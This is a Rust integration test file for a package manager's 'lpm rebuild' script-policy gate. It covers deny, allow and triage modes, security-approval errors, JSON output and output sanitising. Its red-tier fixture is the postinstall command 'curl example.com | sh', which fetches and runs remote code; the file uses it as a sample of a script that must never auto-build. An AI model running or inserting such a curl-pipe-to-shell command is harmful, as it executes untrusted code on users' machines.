//! Workflow tests for `lpm rebuild` policy semantics.
//!
//! The `script-policy` controls which scripted packages
//! enter the rebuild set.
//!
//! - **deny** (default): trusted packages only; untrusted scripted
//!   packages get the legacy "skipped" warning + manifest-edit pointer.
//! - **allow** (`--policy=allow` or `--yolo`): every scripted package
//!   widens, regardless of trust or tier.
//! - **triage**: green-tier packages auto-promoted; ambers + reds stay
//!   blocked behind `lpm approve-scripts`.
//!
//! These tests pin all four observable behaviors at the CLI boundary —
//! a pre-fix binary fails them; a post-fix binary passes.
//!
//! `lpm rebuild --dry-run` is used throughout because actually running
//! the lifecycle scripts would need `node` available + sandbox setup
//! that's out of scope for the policy gate. Dry-run exercises the same
//! selection step in `build::run` without firing scripts.

mod support;

use support::assertions;
use support::{TempProject, lpm};

// ─── Reference postinstall bodies ───────────────────────────────────────
//
// Bodies match the original P6 fixtures for tier classification
// (green = native build, amber = playwright, red = curl|sh).
const GREEN_POSTINSTALL: &str = "node build.js";
const GREEN_BUILD_JS_BODY: &str = "process.exit(0);\n";
const AMBER_POSTINSTALL: &str = "playwright install";
const RED_POSTINSTALL: &str = "curl example.com | sh";

// ─── Helpers ────────────────────────────────────────────────────────────

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' && chars.peek() == Some(&'[') {
            chars.next();
            for cc in chars.by_ref() {
                let cb = cc as u32;
                if (0x40..=0x7e).contains(&cb) {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn assert_no_terminal_controls(context: &str, text: &str) {
    assert!(
        !text.bytes().any(|b| matches!(b, 0x07 | 0x1b | 0x7f)),
        "{context} must not contain terminal control bytes, got:\n{text}"
    );
}

/// Seed `<store>/v1/<safe>@<v>/` with package.json, the requested
/// `postinstall` script body, and the `.integrity` sentinel. Adds
/// `build.js` for green-tier shapes. Returns the store directory path
/// so callers can later check for the post-spawn `.lpm-built` marker.
fn seed_scripted_package(
    project: &TempProject,
    name: &str,
    version: &str,
    postinstall: &str,
) -> std::path::PathBuf {
    let safe = name.replace(['/', '\\'], "+");
    let dir = project
        .store_dir()
        .join("v1")
        .join(format!("{safe}@{version}"));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("package.json"),
        format!(
            r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"{postinstall}"}}}}"#
        ),
    )
    .unwrap();
    std::fs::write(dir.join(".integrity"), "sha512-fixture-skip-verify").unwrap();
    if postinstall.contains("build.js") {
        std::fs::write(dir.join("build.js"), GREEN_BUILD_JS_BODY).unwrap();
    }
    dir
}

/// Materialize a per-package wrapper at
/// `<project>/.lpm/wrappers/<safe>@<v>/node_modules/<name>/` by copying
/// the store entry. A prior fix closed the silent store-fallback
/// hole — lifecycle scripts run from the wrapper, never the store —
/// so any test exercising real spawn (not just dry-run) needs the
/// wrapper materialized to mirror a real post-install state.
fn seed_wrapper(project: &TempProject, store_pkg_dir: &std::path::Path, name: &str, version: &str) {
    let safe = name.replace(['/', '\\'], "+");
    let wrapper_pkg = project
        .path()
        .join(".lpm")
        .join("wrappers")
        .join(format!("{safe}@{version}"))
        .join("node_modules")
        .join(name);
    std::fs::create_dir_all(wrapper_pkg.parent().unwrap()).unwrap();
    copy_dir_recursive(store_pkg_dir, &wrapper_pkg);
}

fn copy_dir_recursive(src: &std::path::Path, dst: &std::path::Path) {
    std::fs::create_dir_all(dst).unwrap();
    for entry in std::fs::read_dir(src).unwrap() {
        let entry = entry.unwrap();
        let entry_dst = dst.join(entry.file_name());
        if entry.file_type().unwrap().is_dir() {
            copy_dir_recursive(&entry.path(), &entry_dst);
        } else {
            std::fs::copy(entry.path(), &entry_dst).unwrap();
        }
    }
}

/// Detect whether `node` is on PATH. Tests that exercise real lifecycle
/// spawn (not just tier classification / dry-run) skip the spawn-side
/// assertion when Node is missing rather than failing — the suite must
/// still run in minimal containers.
#[cfg(target_os = "macos")]
fn node_available() -> bool {
    std::process::Command::new("node")
        .arg("--version")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn write_lockfile_for_packages(project: &TempProject, packages: &[(&str, &str)]) {
    let mut packages = packages.to_vec();
    packages.sort_unstable();
    let pkg_entries: Vec<String> = packages
        .iter()
        .map(|(n, v)| format!("[[packages]]\nname = \"{n}\"\nversion = \"{v}\"\n"))
        .collect();
    let toml = format!(
        "[metadata]\nlockfile-version = 2\nresolved-with = \"pubgrub\"\n\n{}\n",
        pkg_entries.join("\n")
    );
    project.write_file("lpm.lock", &toml);
}

/// Write a manifest with optional `lpm.scriptPolicy` and optional
/// `lpm.trustedDependencies` (legacy bare-name list — bypasses
/// scriptHash check).
fn write_policy_manifest(
    project: &TempProject,
    project_name: &str,
    script_policy: Option<&str>,
    trusted_deps: &[&str],
) {
    let mut lpm = serde_json::Map::new();
    if let Some(p) = script_policy {
        lpm.insert("scriptPolicy".into(), serde_json::Value::String(p.into()));
    }
    if !trusted_deps.is_empty() {
        lpm.insert(
            "trustedDependencies".into(),
            serde_json::Value::Array(
                trusted_deps
                    .iter()
                    .map(|d| serde_json::Value::String((*d).into()))
                    .collect(),
            ),
        );
    }
    let mut manifest = serde_json::json!({
        "name": project_name,
        "version": "0.0.1",
    });
    if !lpm.is_empty() {
        manifest["lpm"] = serde_json::Value::Object(lpm);
    }
    project.write_file(
        "package.json",
        &serde_json::to_string_pretty(&manifest).unwrap(),
    );
}

fn assert_security_approval_scope(out: &std::process::Output, expected_scope: &str) {
    let envelope = assertions::assert_security_approval_required(out);
    let scopes = envelope["error"]["requested_scopes"]
        .as_array()
        .unwrap_or_else(|| panic!("security approval envelope must include scopes: {envelope}"));
    assert!(
        scopes.iter().any(|scope| scope == expected_scope),
        "security approval envelope must include scope `{expected_scope}`; got {envelope}",
    );
}

// ─── deny policy: default selector filters to trusted packages ──────────

/// Hand-authored `trustedDependencies` are guarded before rebuild can
/// use them for selection.
#[tokio::test]
async fn rebuild_deny_policy_with_direct_trust_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(
        &project,
        "rebuild-deny-baseline",
        None, // no scriptPolicy → default deny
        &["trusted-pkg"],
    );
    seed_scripted_package(&project, "trusted-pkg", "1.0.0", "echo hi");
    seed_scripted_package(&project, "untrusted-pkg", "1.0.0", "echo hi");
    write_lockfile_for_packages(
        &project,
        &[("trusted-pkg", "1.0.0"), ("untrusted-pkg", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--policy=deny"])
        .output()
        .expect("spawn lpm rebuild --json");
    assert_security_approval_scope(&out, "trust-bulk-approve");
}

/// The non-snapshot companion also stops at the same trust boundary.
#[tokio::test]
async fn rebuild_deny_policy_direct_trust_filter_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-deny-filter", None, &["trusted-pkg"]);
    seed_scripted_package(&project, "trusted-pkg", "1.0.0", "echo hi");
    seed_scripted_package(&project, "untrusted-pkg", "1.0.0", "echo hi");
    write_lockfile_for_packages(
        &project,
        &[("trusted-pkg", "1.0.0"), ("untrusted-pkg", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--policy=deny"])
        .output()
        .expect("spawn lpm rebuild --json");
    assert_security_approval_scope(&out, "trust-bulk-approve");
}

// ─── allow policy: selector widens to every scripted package ────────────

/// `lpm.scriptPolicy = "allow"` is a guarded script execution widening.
#[test]
fn rebuild_allow_policy_manifest_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-allow-manifest", Some("allow"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    assert_security_approval_scope(&out, "scripts-allow");
}

/// JSON mode must report the same approval boundary for manifest allow.
#[test]
fn rebuild_allow_policy_manifest_json_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-allow-snap", Some("allow"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild --json --dry-run --policy=allow");
    assert_security_approval_scope(&out, "scripts-allow");
}

/// CLI allow and its `--yolo` alias are guarded too.
#[test]
fn rebuild_allow_policy_cli_override_or_yolo_requires_security_approval() {
    let project = TempProject::empty("");
    // No scriptPolicy in manifest — allow signal comes purely from CLI.
    write_policy_manifest(&project, "rebuild-allow-cli", None, &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    // --policy=allow path
    let out_policy = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--policy=allow"])
        .output()
        .expect("spawn lpm rebuild --policy=allow");
    let stdout_policy = strip_ansi(&String::from_utf8_lossy(&out_policy.stdout));
    assert_security_approval_scope(&out_policy, "scripts-allow");
    assert!(
        !stdout_policy.contains("green-native") && !stdout_policy.contains("amber-playwright"),
        "approval error must not include dry-run package selection; stdout:\n{stdout_policy}",
    );

    // --yolo alias path
    let out_yolo = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--yolo"])
        .output()
        .expect("spawn lpm rebuild --yolo");
    let stdout_yolo = strip_ansi(&String::from_utf8_lossy(&out_yolo.stdout));
    assert_security_approval_scope(&out_yolo, "scripts-allow");
    assert!(
        !stdout_yolo.contains("green-native") && !stdout_yolo.contains("amber-playwright"),
        "approval error must not include dry-run package selection; stdout:\n{stdout_yolo}",
    );
}

// ─── deny policy control: confirms allow-fix is allow-scoped ────────────

/// Same fixture under `scriptPolicy = "deny"` keeps the pre-Chunk-2
/// selection: default branch filters to trusted-only, untrusted
/// packages are skipped with the legacy manifest-edit pointer.
/// Pins that the allow widening fix doesn't regress deny mode.
#[test]
fn rebuild_deny_policy_keeps_trusted_only_filter() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-deny-control", Some("deny"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(
        out.status.success(),
        "exit 0 expected; stdout:\n{stdout}\nstderr:\n{stderr}"
    );

    // No trusted entries + no --all → empty default set under deny.
    assert!(
        !stdout.contains("green-native"),
        "deny must filter out untrusted-by-default scripted packages; stdout:\n{stdout}"
    );
    assert!(
        !stdout.contains("amber-playwright"),
        "deny must filter out untrusted-by-default; stdout:\n{stdout}"
    );

    // Skipped-count warning fires + legacy pointer.
    assert!(
        stderr.contains("2 package(s) are not in trustedDependencies"),
        "skipped-count warning must fire under deny; stderr:\n{stderr}"
    );
    assert!(
        stderr.contains("package.json > lpm > trustedDependencies")
            || stderr.contains("lpm rebuild --all"),
        "deny keeps the legacy manifest-edit pointer; stderr:\n{stderr}"
    );
}

// ─── triage policy control: green-only promotion, amber/red blocked ─────

/// `lpm.scriptPolicy = "triage"` is also a guarded script-policy
/// weakening.
#[test]
fn rebuild_triage_policy_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-control", Some("triage"), &[]);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("amber-playwright", "1.0.0"), ("red-curlpipe", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    assert_security_approval_scope(&out, "scripts-triage");
}

// ─── triage policy: green auto-promotion + amber/red blocked ────────────
//
// Five tests covering the triage ship criteria:
//  1. default filter keeps only green-promoted packages in the dry-run
//     set (proves the promotion survives `build::run`'s trust filter,
//     not just the label renderer)
//  2. `--all` widens to every scriptable package; greens render with
//     the "(green-tier auto-approval)" suffix; amber/red show as
//     "not trusted"
//  3. real `lpm rebuild` (no dry-run) auto-builds the green and
//     points users at `lpm approve-scripts` for amber/red
//  4. control: deny doesn't promote anything, keeps the legacy
//     manifest-edit pointer
//  5. `--json` envelope is parseable and stream-separated (no human
//     pointer text bleeds onto stdout)

/// Default filter under triage stops at the approval boundary.
#[test]
fn rebuild_triage_default_dryrun_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-default", Some("triage"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild");
    assert_security_approval_scope(&out, "scripts-triage");
}

/// `--all` cannot bypass the guarded triage policy.
#[test]
fn rebuild_triage_dry_run_all_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-all", Some("triage"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--all"])
        .output()
        .expect("spawn lpm rebuild");
    assert_security_approval_scope(&out, "scripts-triage");
}

/// Real `lpm rebuild` under triage also requires approval before any
/// lifecycle script can be selected or run.
#[test]
fn rebuild_triage_default_build_requires_security_approval() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-build", Some("triage"), &[]);
    let green_dir = seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    let amber_dir = seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    let red_dir = seed_scripted_package(&project, "red-curlpipe", "1.0.0", RED_POSTINSTALL);
    // lifecycle scripts run from the wrapper, never
    // the store — materialize wrappers to mirror real post-install.
    seed_wrapper(&project, &green_dir, "green-native", "1.0.0");
    seed_wrapper(&project, &amber_dir, "amber-playwright", "1.0.0");
    seed_wrapper(&project, &red_dir, "red-curlpipe", "1.0.0");
    write_lockfile_for_packages(
        &project,
        &[
            ("green-native", "1.0.0"),
            ("amber-playwright", "1.0.0"),
            ("red-curlpipe", "1.0.0"),
        ],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild"])
        .output()
        .expect("spawn lpm rebuild");
    assert_security_approval_scope(&out, "scripts-triage");

    // Amber + red must NOT auto-build under triage.
    assert!(
        !amber_dir.join(".lpm-built").exists(),
        "amber package must not auto-build under triage (requires explicit review)"
    );
    assert!(
        !red_dir.join(".lpm-built").exists(),
        "red package must never auto-build"
    );
    assert!(
        !green_dir.join(".lpm-built").exists(),
        "green package must not build before triage approval",
    );
}

/// Control: under deny, the same fixture produces no tier promotion.
/// The classifier still classifies (it's policy-agnostic), but
/// `evaluate_trust` returns `Untrusted` so the package is skipped and
/// the legacy manifest-edit pointer fires (NOT the triage-specific
/// approve-scripts pointer).
#[test]
fn rebuild_deny_skips_all_packages_and_keeps_legacy_pointer() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-deny-skips", Some("deny"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["rebuild"])
        .output()
        .expect("spawn lpm rebuild");
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(
        out.status.success(),
        "rebuild must exit 0 under deny too; stderr:\n{stderr}"
    );
    assert!(
        stderr.contains("package.json > lpm > trustedDependencies")
            || stderr.contains("lpm rebuild --all"),
        "deny must keep the legacy manifest-edit pointer; stderr:\n{stderr}"
    );
    assert!(
        !stderr.contains("Run `lpm approve-scripts` to review"),
        "deny must NOT emit the triage-specific approve-scripts pointer"
    );
}

#[test]
fn rebuild_human_output_collapses_lifecycle_scripts_to_slim_rows() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-slim-output", None, &[]);
    let store_pkg = seed_scripted_package(&project, "green-native", "1.0.0", "echo lifecycle-ok");
    seed_wrapper(&project, &store_pkg, "green-native", "1.0.0");
    write_lockfile_for_packages(&project, &[("green-native", "1.0.0")]);

    let out = lpm(&project)
        .args(["rebuild", "--all"])
        .output()
        .expect("spawn lpm rebuild --all");
    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let stderr = strip_ansi(&String::from_utf8_lossy(&out.stderr));
    assert!(
        out.status.success(),
        "rebuild --all should succeed; stdout:\n{stdout}\nstderr:\n{stderr}",
    );
    assert!(
        stderr.contains("› Rebuilding lifecycle scripts for trusted packages"),
        "must show slim rebuild phase; stderr:\n{stderr}",
    );
    assert!(
        stderr.contains("✓ green-native@1.0.0  postinstall"),
        "must collapse successful lifecycle script to one slim row; stderr:\n{stderr}",
    );
    assert!(
        stderr.contains("✓ Completed 1 script"),
        "must summarize completed script count; stderr:\n{stderr}",
    );
    assert!(
        stderr.contains("✓ Done · rebuild finished in"),
        "must show elapsed rebuild terminus; stderr:\n{stderr}",
    );
    assert!(
        !stderr.contains("→ postinstall:") && !stderr.contains("postinstall completed"),
        "must drop per-step command chatter; stderr:\n{stderr}",
    );
}

#[test]
fn rebuild_lifecycle_output_sanitizes_terminal_controls() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-controls", None, &[]);
    let name = "control-script-pkg";
    let version = "1.0.0";
    let script = "printf 'safe\\033[2J\\n'; printf 'err\\007\\n' >&2";
    let store_pkg = project
        .store_dir()
        .join("v1")
        .join(format!("{name}@{version}"));
    std::fs::create_dir_all(&store_pkg).unwrap();
    std::fs::write(
        store_pkg.join("package.json"),
        serde_json::to_string(&serde_json::json!({
            "name": name,
            "version": version,
            "scripts": { "postinstall": script }
        }))
        .unwrap(),
    )
    .unwrap();
    std::fs::write(store_pkg.join(".integrity"), "sha512-fixture-skip-verify").unwrap();
    seed_wrapper(&project, &store_pkg, name, version);
    write_lockfile_for_packages(&project, &[(name, version)]);

    let out = lpm(&project)
        .args(["rebuild", "--all"])
        .output()
        .expect("spawn lpm rebuild --all");

    let combined = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        out.status.success(),
        "rebuild --all should succeed; output:\n{combined}",
    );
    assert_no_terminal_controls("rebuild lifecycle output", &combined);
    assert!(
        combined.contains("safe") && combined.contains("err"),
        "sanitized lifecycle output should preserve readable text, got:\n{combined}",
    );
}

#[test]
fn rebuild_named_missing_package_fails_in_json_mode() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-missing-named", None, &[]);
    seed_scripted_package(&project, "present-pkg", "1.0.0", "echo lifecycle-ok");
    write_lockfile_for_packages(&project, &[("present-pkg", "1.0.0")]);

    let out = lpm(&project)
        .args(["--json", "rebuild", "missing-pkg", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild missing-pkg --json");

    assert!(
        !out.status.success(),
        "rebuild of an explicit missing package must fail, not succeed as an empty no-op\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );

    let envelope = assertions::parse_json_output(&out.stdout);
    assert_eq!(envelope["success"], serde_json::json!(false));
    let error = envelope["error"].to_string();
    assert!(
        error.contains("missing-pkg") && error.contains("lifecycle scripts"),
        "JSON error must name the requested package and why it was not rebuildable: {envelope}",
    );
}

#[test]
fn rebuild_json_reports_empty_work_without_blank_stdout() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-empty-json", None, &[]);
    write_lockfile_for_packages(&project, &[]);

    let dry_run = lpm(&project)
        .args(["--json", "rebuild", "--dry-run"])
        .output()
        .expect("spawn lpm rebuild --dry-run --json");
    assert!(
        dry_run.status.success(),
        "empty rebuild dry-run should succeed\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&dry_run.stdout),
        String::from_utf8_lossy(&dry_run.stderr),
    );
    let dry_run_json = assertions::parse_json_output(&dry_run.stdout);
    assert_eq!(dry_run_json["dry_run"], serde_json::json!(true));
    assert_eq!(dry_run_json["packages"], serde_json::json!([]));

    let live = lpm(&project)
        .args(["--json", "rebuild"])
        .output()
        .expect("spawn lpm rebuild --json");
    assert!(
        live.status.success(),
        "empty rebuild should succeed\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&live.stdout),
        String::from_utf8_lossy(&live.stderr),
    );
    let live_json = assertions::parse_json_output(&live.stdout);
    assert_eq!(live_json["success"], serde_json::json!(true));
    assert_eq!(live_json["built"], serde_json::json!(0));
    assert_eq!(live_json["failed"], serde_json::json!(0));
}

/// `--json` triage errors are still valid JSON and carry the security
/// approval code instead of human pointer text.
#[test]
fn rebuild_triage_json_security_error_separates_streams() {
    let project = TempProject::empty("");
    write_policy_manifest(&project, "rebuild-triage-json", Some("triage"), &[]);
    seed_scripted_package(&project, "green-native", "1.0.0", GREEN_POSTINSTALL);
    seed_scripted_package(&project, "amber-playwright", "1.0.0", AMBER_POSTINSTALL);
    write_lockfile_for_packages(
        &project,
        &[("green-native", "1.0.0"), ("amber-playwright", "1.0.0")],
    );

    let out = lpm(&project)
        .args(["--json", "rebuild", "--dry-run", "--all"])
        .output()
        .expect("spawn lpm rebuild --json");

    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
        .unwrap_or_else(|e| panic!("rebuild --json --dry-run stdout must be parseable JSON. Parse error: {e}\nstdout:\n{stdout}"));
    assert_eq!(parsed["success"].as_bool(), Some(false));
    assert_eq!(
        parsed["error"]["code"].as_str(),
        Some("SECURITY_APPROVAL_REQUIRED")
    );
    assert_security_approval_scope(&out, "scripts-triage");
}

// ─── strict + sandbox-log coverage ──────────────────────────────────────
//
// `--strict-sandbox` and `--sandbox-log` are NOT clap-rejected (they
// have orthogonal-looking intents: one wants enforcement, the other
// wants observation). When both arrive, `decide_runtime_sandbox_mode`
// collapses to `SandboxMode::LogOnly` (the user explicitly asked to
// observe). Pre-fix the install pipeline then emitted BOTH banners:
//
//   ! strict-sandbox: outbound network will be denied for every lifecycle script ...
//   ! --sandbox-log: diagnostic mode only. Rule triggers are logged but NOT enforced ...
//
// — a contradictory pair. The fix gates the strict banner on the final
// `SandboxMode::Enforce`; under LogOnly only the sandbox-log banner
// fires. This test exercises that wiring end-to-end and pins the
// contract so a future change that re-broadens the strict banner
// trips this assertion directly.
//
// macOS-only: Linux landlock has no native observe-only primitive,
// so `--sandbox-log` errors at the pre-probe with
// `ModeNotSupportedOnPlatform` BEFORE the banner code runs — there's
// nothing to assert about banner truthfulness on Linux.
#[cfg(target_os = "macos")]
#[test]
fn rebuild_strict_plus_sandbox_log_suppresses_strict_banner_under_logonly() {
    if !node_available() {
        // Skip: this test needs a real spawn (not dry-run) to reach
        // the banner site. Mirrors the soft-pass pattern used by
        // other rebuild tests that exercise lifecycle scripts.
        eprintln!(
            "skipping rebuild_strict_plus_sandbox_log_suppresses_strict_banner_under_logonly: node not on PATH"
        );
        return;
    }
    let project = TempProject::empty("");
    write_policy_manifest(
        &project,
        "rebuild-strict-plus-sandbox-log",
        None, // deny default — but we'll trust the package below
        &["green-pkg"],
    );
    let store_pkg = seed_scripted_package(&project, "green-pkg", "1.0.0", GREEN_POSTINSTALL);
    seed_wrapper(&project, &store_pkg, "green-pkg", "1.0.0");
    write_lockfile_for_packages(&project, &[("green-pkg", "1.0.0")]);

    let out = lpm(&project)
        .args(["--json", "rebuild", "--strict-sandbox", "--sandbox-log"])
        .output()
        .expect("spawn lpm rebuild --strict-sandbox --sandbox-log");
    assert_security_approval_scope(&out, "trust-bulk-approve");
}
